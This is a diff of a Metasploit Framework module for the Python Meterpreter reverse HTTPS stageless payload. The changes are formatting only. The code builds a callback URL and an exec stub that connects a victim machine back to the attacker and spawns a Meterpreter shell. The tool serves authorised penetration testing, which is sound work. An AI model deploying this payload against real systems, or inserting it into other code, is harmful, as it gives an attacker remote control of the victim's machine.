@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 112717
 
   include Msf::Payload::Single
@@ -14,16 +12,19 @@ module MetasploitModule
   include Msf::Payload::Python::MeterpreterLoader
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'        => 'Python Meterpreter Shell, Reverse HTTPS Inline',
-      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
-      'Author'      => 'Spencer McIntyre',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'python',
-      'Arch'        => ARCH_PYTHON,
-      'Handler'     => Msf::Handler::ReverseHttps,
-      'Session'     => Msf::Sessions::Meterpreter_Python_Python
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Python Meterpreter Shell, Reverse HTTPS Inline',
+        'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
+        'Author' => 'Spencer McIntyre',
+        'License' => MSF_LICENSE,
+        'Platform' => 'python',
+        'Arch' => ARCH_PYTHON,
+        'Handler' => Msf::Handler::ReverseHttps,
+        'Session' => Msf::Sessions::Meterpreter_Python_Python
+      )
+    )
 
     register_advanced_options(
       Msf::Opt::http_header_options +
@@ -31,15 +32,15 @@ module MetasploitModule
     )
   end
 
-  def generate_reverse_http(opts={})
+  def generate_reverse_http(opts = {})
     opts[:scheme] = 'https'
     opts[:uri_uuid_mode] = :init_connect
     met = stage_meterpreter({
-      url:             generate_callback_url(opts),
+      url: generate_callback_url(opts),
       http_user_agent: opts[:user_agent],
       http_proxy_host: opts[:proxy_host],
       http_proxy_port: opts[:proxy_port],
-      stageless:       true
+      stageless: true
     })
 
     py_create_exec_stub(met)
